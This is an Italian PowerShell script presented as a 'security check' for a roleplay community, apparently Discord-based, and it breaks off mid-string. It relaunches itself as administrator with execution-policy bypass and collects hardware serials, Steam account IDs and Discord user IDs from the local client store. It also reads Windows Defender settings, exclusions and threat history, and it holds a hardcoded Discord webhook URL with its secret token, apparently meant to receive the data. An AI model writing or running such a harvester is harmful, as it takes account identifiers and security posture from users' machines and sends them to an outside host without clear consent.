if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Clear-Host

# --- BANNER PULITO E ORDINATO ---
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host "                        N O W   R P                       " -ForegroundColor Yellow
Write-Host "                   CONTROLLO DI SICUREZZA                 " -ForegroundColor Green
Write-Host "==================================================================`n" -ForegroundColor Cyan

$n = Read-Host "[?] Inserisci il tuo Nickname Discord"
$h = "https://discord.com/api/webhooks/1563712931722436699/_m9P-Wv-MOKjAO-gsmvG0xD9J7OGi7rwdz4mYoCnhQ2fsbEoQ-uc05AM6pwe3GbwCo50"

Write-Host "`n[*] Raccolta dati hardware e di sistema in corso..." -ForegroundColor DarkYellow

$s = Get-CimInstance Win32_OperatingSystem
$o =$s.InstallDate.ToString('dd/MM/yyyy HH:mm')
$sr =$s.SerialNumber
$pc = (Get-CimInstance Win32_ComputerSystem).Model
$gpu = (Get-CimInstance Win32_VideoController).Name -join ", "

$v = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
$st = "Non trovato"
if(Test-Path $v){ $id = (Get-Content$v -EA 0 | Select-String '"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('"')[1] }); if($id){ $st =$id -join ", " } }

$dc = (Get-ChildItem "$env:APPDATA" -Filter "*discord*" -EA 0).Count
$tk = Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -EA 0 | Select-String -Pattern '"id":"(\d{17,19})"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } \vert{} Select-Object -Unique$di = if($tk){$tk -join ", " } else { "Nessuno" }

Write-Host "[*] Scansione difese e configurazioni di sicurezza..." -ForegroundColor DarkYellow
$def = Get-MpComputerStatus -EA 0
$rt = if($def.RealTimeProtectionEnabled){ "Attiva (OK)" } else { "Disattivata (ATTENZIONE!)" }
$cloud = if($def.CloudBlockLevel){ "Attivo" } else { "Disattivato" }
$antispy = if($def.AntispywareEnabled){ "Attivo" } else { "Disattivato" }

$pref = Get-MpPreference -EA 0$exPath = if($pref.ExclusionPath){$pref.ExclusionPath -join ", " } else { "Nessun percorso escluso" }
$exExt = if($pref.ExclusionExtension){$pref.ExclusionExtension -join ", " } else { "Nessuna estensione esclusa" }
$exProc = if($pref.ExclusionProcess){$pref.ExclusionProcess -join ", " } else { "Nessun processo escluso" }

Write-Host "[*] Estrazione cronologia minacce e file recenti..." -ForegroundColor DarkYellow
$threats = Get-MpThreatDetection -EA 0$threatList = "Nessuna minaccia recente registrata"
if ($threats) {
    $threatList = ($threats | Select-Object -First 5 | ForEach-Object {
        $tn =$_.InitialDetectionName
        $tr =$_.Resources -join " | "
        "Rilevamento: $tn
